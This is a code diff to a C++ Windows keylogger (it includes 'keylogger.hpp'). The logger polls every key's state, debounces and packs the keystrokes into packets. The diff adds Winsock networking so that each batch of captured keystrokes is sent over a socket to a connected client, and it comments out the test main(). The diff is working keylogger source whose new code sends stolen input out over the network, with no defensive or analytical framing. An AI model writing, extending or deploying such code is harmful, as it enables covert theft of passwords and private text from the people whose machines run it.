@@ -1,16 +1,16 @@
-#include <windows.h>
-#include <winuser.h>
 #include <iostream>
 #include <string>
 #include <fstream>
-#include <cstdint>
-#include <vector>
-#include <array>
 #include <unordered_set>
-#include <unordered_map>
 #include <chrono>
 #include <bitset>
-
+#ifdef _WIN32
+#include <winsock2.h>
+#include <Windows.h>
+#include <winuser.h>
+#include <ws2tcpip.h>
+#endif
+#include "keylogger.hpp"
 #define ARRAY_SIZE 32
 #define DEBOUNCE_DURATION 50
 void updateKeyState(uint8_t vkCode, bool pressed, std::array<uint8_t, ARRAY_SIZE>& keyStates) {
@@ -104,7 +104,8 @@ std::vector<uint32_t> packetize(std::vector<uint32_t> keystrokes){
 
     return packets;
 }
-void startLogging() {
+
+void startLogging(SOCKET clientFD,std::atomic<bool>& running) {
     std::vector<BYTE> currentKeys; 
     std::vector<BYTE> pastKeys; 
     std::array<uint8_t, ARRAY_SIZE> keyStates = { 0 };
@@ -113,7 +114,7 @@ void startLogging() {
     std::unordered_map<BYTE, std::chrono::steady_clock::time_point> keyPressTimes;
     std::chrono::milliseconds debounceDuration = std::chrono::milliseconds(DEBOUNCE_DURATION);
 
-    while (true) {    
+    while (running) {    
         currentKeys.clear();
 
         for (BYTE vkCode = 0; vkCode < 255; ++vkCode) {
@@ -136,18 +137,26 @@ void startLogging() {
                 std::cout<<binary<<std::endl;
             }
             std::cout<<std::endl;
+
+            const char* buffer = reinterpret_cast<const char*>(packets.data());
+
+            // Send the whole vector as a buffer
+
+            size_t bytesSent = send(clientFD, buffer, packets.size() * sizeof(uint32_t), 0);
+            if (bytesSent == SOCKET_ERROR) {
+                std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
+            } else {
+                std::cout << "Bytes sent: " << bytesSent << std::endl;
+            }
         }
         pastKeys = currentKeys;  
 
         Sleep(100); // Sleep to reduce CPU usage
     }
 }
-int main(){
-    // std::string scriptPath =".\\scripts\\testOutput.ps1"; 
-    // testpowershell(scriptPath);
-    // printf("hello world changed");
-    printf("starting test");
-    std::cout<<"test from std::cout"<<std::endl;
-    startLogging();
-}
+// int main(){
+//     printf("starting test");
+//     std::cout<<"test from std::cout"<<std::endl;
+//     startLogging();
+// }
 
